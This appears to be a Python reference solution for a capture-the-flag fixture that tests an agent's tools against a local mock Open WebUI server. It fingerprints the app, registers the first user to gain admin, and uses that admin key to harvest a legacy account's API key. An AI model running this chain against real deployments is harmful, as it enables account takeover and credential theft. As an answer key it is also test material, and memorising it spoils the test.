#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""03 参考解：probe 定型 Open WebUI → 首个注册用户拿 admin → 管理面翻 legacy key。"""
from __future__ import annotations

import json
import re
import sys
import threading
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[3] / "src"))
sys.path.insert(0, str(HERE))

from ctfy_agent.tools_local import LocalTools  # noqa: E402

import server  # noqa: E402


class _Store:
    def add_note(self, *args, **kwargs):  # noqa: D102
        pass


def main() -> int:
    srv, port = server.serve()
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        tools = LocalTools(_Store(), "fixture-infra-03")
        tools.allow_instance("127.0.0.1", port)
        base = f"http://127.0.0.1:{port}"

        # 1) 指纹：probe 定型 Open WebUI
        raw = tools.http_map(base + "/", mode="probe")
        payload = json.loads(raw)
        comps = payload.get("components") or []
        assert "Open WebUI" in comps, f"probe 未定型 Open WebUI：components={comps}；raw[:300]={raw[:300]}"
        hit = next(h for h in payload.get("hits", []) if h.get("component") == "Open WebUI")
        assert hit["path"] == "/api/config", f"Open WebUI 特征路径不对：{hit}"

        # 2) 打法（next 第 4 条）：首个注册用户即 admin
        signup = tools.http_request(
            base + "/api/v1/auths/signup", method="POST",
            body=json.dumps({"email": "red-team@probe.local", "password": "Passw0rd!probe",
                             "name": "probe"}),
            headers={"Content-Type": "application/json"},
        )
        key = re.search(r"sk-openwebui-admin-\w+", signup)
        if not key:
            print(f"[fail] signup 没拿到 admin key：{signup[:300]}", file=sys.stderr)
            return 1

        # 3) 用 admin key 翻管理面，找 legacy 账号的 api_key
        listing = tools.http_request(
            base + "/api/v1/auths/", method="GET",
            headers={"Authorization": f"Bearer {key.group(0)}"},
        )
        match = re.search(r"webui-legacy-key-\w+", listing)
        if not match:
            print(f"[fail] 管理面里没找到 legacy key：{listing[:300]}", file=sys.stderr)
            return 1
        print("[infra] openwebui")
        print(match.group(0))
        return 0
    finally:
        srv.shutdown()
        srv.server_close()


if __name__ == "__main__":
    raise SystemExit(main())
